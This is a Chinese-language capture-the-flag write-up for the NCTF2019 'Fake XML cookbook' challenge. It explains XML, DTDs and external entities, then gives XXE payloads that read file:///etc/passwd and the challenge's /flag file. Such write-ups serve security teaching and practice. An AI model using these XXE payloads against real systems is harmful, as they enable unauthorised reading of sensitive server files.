            <h1 style="display: none">XXE漏洞</h1>
            
            <div class="markdown-body">
              <h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XXE漏洞</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Injection)全称为<span class="hljs-type">XML</span>外部实体注入<br><br><span class="hljs-type">XML</span>：设计用来传输与显示数据，其焦点是数据的内容<br>HTML：设计用来显示数据，其焦点是数据的外观<br><br><span class="hljs-type">XML</span>文档类型定义，即DTD。XXE漏洞所在的地方<br>XXE漏洞的触发点一般发生在可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致恶意的<span class="hljs-type">xml</span>文件被上传。<br></code></pre></td></tr></table></figure>

<h4 id="XML基本了解"><a href="#XML基本了解" class="headerlink" title="XML基本了解"></a>XML基本了解</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs xml">xml的注意要求：<br>1. 所有xml元素都必须有关闭标签<br>2. xml标签对大小写敏感<br>3. xml必须正确嵌套<br>4. xml文档必须有根元素<br>5. xml的属性值必须加引号<br><br>xml文档的注释：<span class="hljs-comment">&lt;!-- --&gt;</span><br><br>DTD(文档类型定义)：可定义合法的xml文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可以作为一个外部引用<br><br>DTD的三种应用形式：<br>1. 内部DTD文档  <span class="hljs-meta">&lt;!DOCTYPE 根元素[定义内容]&gt;</span><br>2. 外部DTD文档  <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD文件路径&quot;</span>&gt;</span><br>3. 内外DTD结合  <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD文件路径&quot;</span> [定义内容]&gt;</span><br><br>DTD实体：<br>用于定义引用普通文本或特殊的快捷方式变量；实体引用是对实体的以用；实体可在内部或外部进行声明。<br>实体分为：一般实体和参数实体<br>一般实体的声明方法：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体内容&quot;</span>&gt;</span>  引用一般实体的方法：&amp;实体名称<br>* 一般实体可以在DTD，xml，声明前，实体声明内部引用<br>参数实体的声明：<span class="hljs-meta">&lt;!ENTITY % 实体名称 <span class="hljs-meta-string">&quot;实体内容&quot;</span>&gt;</span>  引用参数实体的方法：%实体名称<br>* 参数实体只能在DTD中引用<br>内部实体：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span> &gt;</span> <br>例：<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-string">&quot;hello&quot;</span>&gt;</span>]&gt;</span> <br>   <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br>外部实体：用来引入外部资源，有SYSTEM 和 PUBLIC 两个关键字，表示实体来自本地计算机还是公共计算机<br><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URL&quot;</span>&gt;</span><br><br>外部实体的引用可以利用如下协议：<br>file:///path/to/file.txt<br>http://url/file.txt<br>php://filter/read=convert.base64-encode/resource=flag.txt<br><br>外部实体可以支持http,file 等协议，所以可以通过引用外部实体进行远程文件读取<br>例：<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br>	<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xdsec</span> [</span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">methodname</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span>(实体引用名) <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>(实体内容) &gt;</span>]&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span><br>	这里的xml外部实体xxe被赋予的值为file:///etc/passwd 当解析xml文档时，&amp;xxe会被替换为file:///ect/passwd的内容，导致敏感信息泄露<br></code></pre></td></tr></table></figure>

<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>此题就是一个简单的xxe攻击</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">payload:</span><br><span class="php"><span class="hljs-meta">&lt;?</span> xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELENENT <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">person</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;person;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
